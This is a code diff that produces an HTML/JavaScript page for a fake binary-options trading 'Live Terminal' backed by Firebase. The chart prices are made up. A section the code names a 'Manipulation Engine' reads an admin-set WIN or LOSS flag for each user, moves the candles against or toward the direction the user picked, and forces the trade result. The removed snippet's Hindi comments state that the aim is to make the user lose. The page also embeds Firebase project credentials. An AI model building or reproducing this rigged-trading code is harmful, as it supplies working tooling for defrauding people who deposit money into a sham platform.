@@ -1,29 +1,146 @@
-// --- POWER MANIPULATION LOGIC (POSITION BASED) ---
-if (isActive) {
-    // 'userDir' woh direction hai jo user ne select ki (UP ya DOWN)
-    
-    if (adminMode === "WIN") {
-        if (userDir === 'UP') {
-            drift = Math.abs(drift) + 15; // User ne UP kaha, to forcefully UP le jao
-        } else {
-            drift = -Math.abs(drift) - 15; // User ne DOWN kaha, to forcefully DOWN le jao
-        }
-    } 
-    else if (adminMode === "LOSS") {
-        if (userDir === 'UP') {
-            drift = -Math.abs(drift) - 15; // User ne UP kaha, use haraane ke liye DOWN le jao
-        } else {
-            drift = Math.abs(drift) + 15; // User ne DOWN kaha, use haraane ke liye UP le jao
-        }
-    }
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Terminal | Pro</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
+    <style>
+        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #f0b90b; --green: #02c076; --red: #f6465d; --text: #ffffff; }
+        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 10px; overflow: hidden; }
+        #chart-container { height: 350px; width: 100%; background: #161a1e; border-radius: 12px; position: relative; border: 1px solid #2b3139; }
+        .price-overlay { position: absolute; top: 15px; left: 15px; z-index: 10; font-size: 1.8rem; font-weight: bold; font-family: monospace; }
+        .controls { background: var(--card); padding: 15px; border-radius: 15px; margin-top: 10px; border: 1px solid #2b3139; }
+        #timer-box { text-align: center; color: var(--yellow); font-size: 1.2rem; font-weight: bold; margin-bottom: 5px; }
+        input { width: 100%; padding: 12px; margin: 5px 0; background: #2b3139; border: 1px solid #474d57; color: white; border-radius: 8px; box-sizing: border-box; }
+        .btn-group { display: flex; justify-content: space-between; margin-top: 10px; }
+        .btn-up { background: var(--green); width: 48%; padding: 15px; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; }
+        .btn-down { background: var(--red); width: 48%; padding: 15px; border: none; color: white; font-weight: bold; border-radius: 8px; cursor: pointer; }
+        #res-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 1000; }
+    </style>
+</head>
+<body>
 
-// Candle update logic
-let close = open + drift;
-candleSeries.update({
-    time: currentTime,
-    open: open,
-    high: Math.max(open, close, open + 5),
-    low: Math.min(open, close, open - 5),
-    close: close
-});
+    <div id="res-popup">
+        <img id="res-img" src="" style="width:120px;">
+        <h1 id="res-msg" style="margin:20px 0;"></h1>
+        <h2 id="res-amt" style="color:var(--yellow)"></h2>
+        <button onclick="closeRes()" style="margin-top:20px; padding:10px 40px; background:var(--yellow); border:none; border-radius:8px; font-weight:bold;">NEXT TRADE</button>
+    </div>
+
+    <div id="chart-container">
+        <div class="price-overlay" id="price-txt">Loading...</div>
+    </div>
+
+    <div class="controls">
+        <div id="timer-box">Market Active</div>
+        <input type="number" id="trade-amt" placeholder="Investment ($)">
+        <div class="btn-group">
+            <button class="btn-up" onclick="startTrade('UP')">CALL (UP)</button>
+            <button class="btn-down" onclick="startTrade('DOWN')">PUT (DOWN)</button>
+        </div>
+    </div>
+
+<script>
+    // Firebase Config (Replace yours)
+    const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const auth = firebase.auth();
+
+    const chart = LightweightCharts.createChart(document.getElementById('chart-container'), {
+        layout: { backgroundColor: '#161a1e', textColor: '#d1d4dc' },
+        grid: { vertLines: { visible: false }, horzLines: { color: '#2b3139' } },
+        timeScale: { timeVisible: true, secondsVisible: true }
+    });
+    const candleSeries = chart.addCandlestickSeries({ upColor: '#02c076', downColor: '#f6465d' });
+
+    let lastClose = 45230.50;
+    let isActive = false;
+    let currentDir = ""; 
+    let adminMode = "NORMAL";
+    let entryPrice = 0;
+    let entryLine;
+
+    // Manipulation Engine
+    setInterval(() => {
+        let open = lastClose;
+        let drift = (Math.random() - 0.5) * 8;
+
+        if (isActive) {
+            // Position-Based Logic
+            if (adminMode === "WIN") {
+                drift = (currentDir === 'UP') ? Math.abs(drift) + 12 : -Math.abs(drift) - 12;
+            } else if (adminMode === "LOSS") {
+                drift = (currentDir === 'UP') ? -Math.abs(drift) - 12 : Math.abs(drift) + 12;
+            }
+        }
+
+        let close = open + drift;
+        candleSeries.update({
+            time: Math.floor(Date.now() / 1000),
+            open: open, high: Math.max(open, close, open + 4),
+            low: Math.min(open, close, open - 4), close: close
+        });
+        lastClose = close;
+        document.getElementById('price-txt').innerText = close.toFixed(2);
+        document.getElementById('price-txt').style.color = close >= open ? "#02c076" : "#f6465d";
+    }, 1000);
+
+    auth.onAuthStateChanged(u => { if(u) db.ref('users/'+u.uid+'/control').on('value', s => adminMode = s.val() || "NORMAL"); });
+
+    function startTrade(dir) {
+        const user = auth.currentUser;
+        const amt = parseFloat(document.getElementById('trade-amt').value);
+        if(!user || isNaN(amt)) return alert("Check Login/Amount");
+
+        db.ref('users/'+user.uid).once('value', snap => {
+            const bal = snap.val().balance;
+            if(amt > bal) return alert("Low Balance");
+
+            isActive = true; currentDir = dir; entryPrice = lastClose;
+            entryLine = candleSeries.createPriceLine({ price: entryPrice, color: '#f0b90b', title: 'ENTRY' });
+            
+            db.ref('users/'+user.uid).update({ balance: bal - amt });
+
+            let time = 30;
+            const timer = setInterval(() => {
+                time--;
+                document.getElementById('timer-box').innerText = "Closing: " + time + "s";
+                if(time <= 0) {
+                    clearInterval(timer);
+                    finishTrade(user.uid, dir, amt, bal);
+                }
+            }, 1000);
+        });
+    }
+
+    function finishTrade(uid, dir, amt, oldBal) {
+        isActive = false;
+        candleSeries.removePriceLine(entryLine);
+        
+        let win = (adminMode === "WIN") ? true : (adminMode === "LOSS") ? false : (dir === 'UP' ? lastClose > entryPrice : lastClose < entryPrice);
+
+        const pop = document.getElementById('res-popup');
+        if(win) {
+            let winAmt = amt * 1.85;
+            db.ref('users/'+uid).update({ balance: (oldBal - amt) + winAmt });
+            document.getElementById('res-img').src = "https://cdn-icons-png.flaticon.com/512/148/148767.png";
+            document.getElementById('res-msg').innerText = "PROFIT!";
+            document.getElementById('res-msg').style.color = "#02c076";
+            document.getElementById('res-amt').innerText = "+$" + (amt * 0.85).toFixed(2);
+        } else {
+            document.getElementById('res-img').src = "https://cdn-icons-png.flaticon.com/512/6659/6659895.png";
+            document.getElementById('res-msg').innerText = "LOSS";
+            document.getElementById('res-msg').style.color = "#f6465d";
+            document.getElementById('res-amt').innerText = "-$" + amt.toFixed(2);
+        }
+        pop.style.display = "flex";
+    }
+
+    function closeRes() { document.getElementById('res-popup').style.display = "none"; document.getElementById('timer-box').innerText = "Market Active"; }
+</script>
+</body>
+</html>
